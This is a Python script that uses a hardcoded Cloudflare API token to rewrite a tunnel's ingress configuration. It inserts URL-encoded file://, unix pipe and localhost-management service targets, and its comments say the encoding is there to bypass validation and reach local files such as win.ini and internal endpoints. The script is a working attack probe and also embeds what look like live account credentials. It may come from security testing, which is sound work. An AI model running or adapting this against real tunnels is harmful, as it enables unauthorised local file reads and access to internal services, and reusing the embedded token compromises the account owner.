import urllib.request
import json
import time

SUPER_TOKEN = "HBkXgm2nAYlRAhgyULBebnw-4a-HQ-Mcuv0U_W42"
ACCOUNT_ID = "4c2932bc3381be38d5266241b16be092"
TUNNEL_ID = "926eac5e-2642-4a16-9edc-c06b6c705ab8"


def api_request(method, url, data=None):
    headers = {
        "Authorization": f"Bearer {SUPER_TOKEN}",
        "Content-Type": "application/json",
    }
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode() if data else None,
        headers=headers,
        method=method,
    )
    try:
        with urllib.request.urlopen(req) as response:
            return json.loads(response.read().decode())
    except Exception as e:
        print(f"Error: {e}")
        return None


def update_config_with_dangerous_schemes():
    res = api_request(
        "GET",
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations",
    )
    if not res:
        return
    config = res["result"]["config"]

    # Attempting to inject schemes that might be interpreted differently by cloudflared
    # file:///, unix://, pipe://, etc.
    # We use URL encoding to potentially bypass frontend validation
    test_ingress = [
        {
            "hostname": "file-read.scan.ai-smith.net",
            "service": "file%3A%2F%2F%2FC%3A%2FWindows%2Fwin.ini",
        },
        {
            "hostname": "pipe-access.scan.ai-smith.net",
            "service": "unix%3A%2F%2F%2F.%2Fpipe%2Fcloudflared",
        },
        {
            "hostname": "mgmt-direct.scan.ai-smith.net",
            "service": "http%3A%2F%2Flocalhost%3A20241%2Fconfig",
        },
    ]

    ingress = config["ingress"]
    ingress = [r for r in ingress if "scan.ai-smith.net" not in r.get("hostname", "")]

    for r in reversed(test_ingress):
        ingress.insert(0, r)

    config["ingress"] = ingress

    print("Updating config with encoded schemes...")
    update_res = api_request(
        "PUT",
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations",
        {"config": config},
    )
    if update_res and update_res.get("success"):
        print("Update SUCCESSFUL. Waiting for propagation...")
    else:
        print("Update FAILED.")
        print(update_res)


if __name__ == "__main__":
    update_config_with_dangerous_schemes()
